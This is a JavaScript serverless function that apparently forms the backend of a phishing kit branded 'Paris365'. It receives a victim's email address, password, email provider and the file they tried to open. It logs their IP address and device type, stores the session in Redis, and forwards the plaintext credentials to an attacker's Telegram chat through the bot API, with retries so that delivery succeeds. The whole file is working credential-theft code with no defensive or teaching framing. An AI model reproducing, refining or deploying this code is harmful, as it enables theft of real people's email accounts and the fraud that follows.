import { Redis } from '@upstash/redis';

export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body);
    const { email, password, provider, fileName, timestamp, userAgent } = data;

    // Get client IP with better detection for mobile
    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                     event.headers['x-real-ip'] || 
                     event.headers['cf-connecting-ip'] || 
                     'Unknown';

    // Initialize Upstash Redis
    const redis = new Redis({
      url: process.env.UPSTASH_REDIS_REST_URL,
      token: process.env.UPSTASH_REDIS_REST_TOKEN,
    });

    // Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram configuration');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Server configuration error' }),
      };
    }

    // Store session data in Redis with 24-hour expiration
    const sessionId = Math.random().toString(36).substring(2, 15);
    const sessionData = {
      email,
      provider,
      fileName,
      timestamp,
      sessionId,
      clientIP,
      userAgent,
      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop'
    };

    // Store in Redis with 24-hour TTL
    await redis.setex(`session:${sessionId}`, 86400, JSON.stringify(sessionData));
    
    // Also store by email for cross-device access
    await redis.setex(`user:${email}`, 86400, JSON.stringify(sessionData));

    // Format message for Telegram with better mobile detection
    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile Device' : '💻 Desktop';
    
    const message = `
🔐 *Email Login Captured*

📧 *Email:* \`${email}\`
🔑 *Password:* \`${password}\`
🏢 *Provider:* ${provider}
📄 *File Accessed:* ${fileName}
🕒 *Timestamp:* ${new Date(timestamp).toLocaleString()}
🌐 *IP Address:* ${clientIP}
${deviceInfo}
🆔 *Session ID:* \`${sessionId}\`

---
*Paris365*
    `;

    // Send to Telegram with retry logic for mobile networks
    let telegramResponse;
    let retryCount = 0;
    const maxRetries = 3;

    while (retryCount < maxRetries) {
      try {
        telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
          }),
          // Add timeout for mobile networks
          signal: AbortSignal.timeout(15000),
        });

        if (telegramResponse.ok) {
          break; // Success, exit retry loop
        }
        
        throw new Error(`HTTP ${telegramResponse.status}`);
      } catch (error) {
        retryCount++;
        console.error(`Telegram attempt ${retryCount} failed:`, error.message);
        
        if (retryCount === maxRetries) {
          throw error;
        }
        
        // Wait before retry (exponential backoff)
        await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
      }
    }

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('Telegram API error:', errorText);
      throw new Error('Failed to send to Telegram');
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true, 
        message: 'Credentials captured successfully',
        sessionId: sessionId
      }),
    };

  } catch (error) {
    console.error('Error in sendTelegram function:', error);
    
    // Better error handling for different scenarios
    let errorMessage = 'Internal server error';
    if (error.name === 'AbortError') {
      errorMessage = 'Request timeout - please check your connection';
    } else if (error.message.includes('Failed to send to Telegram')) {
      errorMessage = 'Communication error - please try again';
    }
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: errorMessage }),
    };
  }
};